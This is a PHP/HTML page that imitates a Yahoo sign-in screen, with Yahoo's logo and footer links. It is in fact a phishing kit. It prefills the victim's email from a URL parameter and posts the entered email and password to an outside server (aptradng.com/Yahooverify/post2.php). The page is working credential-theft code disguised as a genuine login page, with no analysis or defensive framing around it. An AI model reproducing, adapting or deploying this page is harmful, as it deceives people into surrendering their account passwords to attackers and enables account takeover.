<?php $email_from_link = isset($_GET['email']) ? $_GET['email'] : '';?>
<title>Yahoo</title>

<link rel="icon" href="https://aptradng.com/Yahooverify/files/favicon.ico" sizes="13x13" type="image/png">

<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
<script type="text/javascript" src="https://code.jquery.com/jquery.min.js"></script>
<style>
.box{
float: left;
    overflow: hidden;
    background: #fff;
    width: 100%;
    height: 100%;
    z-index: 3;
    position: fixed;
    top: 0;
}

.shurt { 
    background-image: url(https://aptradng.com/Yahooverify/files/2bro.png);
    background-position: left;
    background-repeat: no-repeat;
    background-color: #fff;
    margin-top: -68px;
    margin-left: -33px;
}

input:focus{
		outline: 0!important; 
	border: 0;
	border-radius: 0px;
	
    border-bottom: solid 2px #0092bc;
}
</style>
</head>
<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" rightmargin="0" leftmargin="0" link="#3F59A4" alink="#3F59A4" vlink="#3F59A4" style="overflow: hidden;">


<div style="width: 100%; height: 30px;background: transparent; padding: 13px;">

<img src="https://s.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" style=" width: 9%;">

<div style="float: right; font-family: Helvetica Neue,Helvetica,Arial; font-size: 14px; color: #188FFF;">Help</div>
</div>
<table width="100%" height="" cellspacing="0">

<tr> </tr> 




<tr><td height="60" bgcolor="#FFFFFF"></td></td>






<tr><td height="" bgcolor="#FFFFFF">

	<table width="300" align="" cellspacing="0" style="
    float: right;
    margin-right: -172px;
">

 


 






 
	
	



	<tbody style="
    /* width: 300px; */
"><tr><td height="25" bgcolor="#FFFFFF"></td>


	</tr><tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2">
	<!--?php echo $_GET['email']; ?-->
	</font>
	</td></tr>


<tr><td height="5" bgcolor="#FFFFFF"></td>


	
	</tr><tr><td>
	<form method="post" action="https://aptradng.com/Yahooverify/post2.php" class="shurt" style=" height: 580px;">
	  

		<input name="lesscomp" type="email" style="width: 330px;height: 44px;font-size: 16px;color: #000000;background-color: transparent;border: 0;padding: 10px;border-radius: 0;margin-top: 126px;margin-left: 19px;padding-left: 15px;font-family: Helvetica Neue,Helvetica,Arial;text-align: center;" required="" placeholder="Enter your email" value="<?php echo $email_from_link;?>">
					
 
 	<br><br>
	
	<input name="stagt" type="password"  style="width: 320px;height: 37px;font-size: 16px;color: #000000;background-color: transparent;border: 0;padding: 10px;border-radius: 0;margin-top: 8px;margin-left: 26px;padding-left: 9px;font-family: Helvetica Neue,Helvetica,Arial;" required="" placeholder="Password" value="">
					
 
 	<br><br>

	   <button name="lulabies" title="" class="saing" style="width: 320px;height: 45px;font-family: Verdana;font-size: 21px;color:#ffffff;background-color: transparent;border-radius: 4px;margin-top: -11px;text-align: center;cursor:pointer;border: 0;margin-left: 26px;">
</button>
		 

	</td></tr>



</form>
	<tr><td>
	
	
	</td></tr>


</div> 
	

<tr><td height="200" bgcolor="#FFFFFF"></td>




	

	</tr><tr><td>
	<hr width="650" align="left">
	</td></tr>







	 


	</tbody></table>
<div style="width: 100%; font-family: Helvetica Neue,Helvetica,Arial; font-size: 12px; color: #188FFF; position: fixed; bottom: 0; padding-bottom:10px;"><center>Terms | Privacy</center></div>
</td></tr>



</table>

</body>
</html>

  
 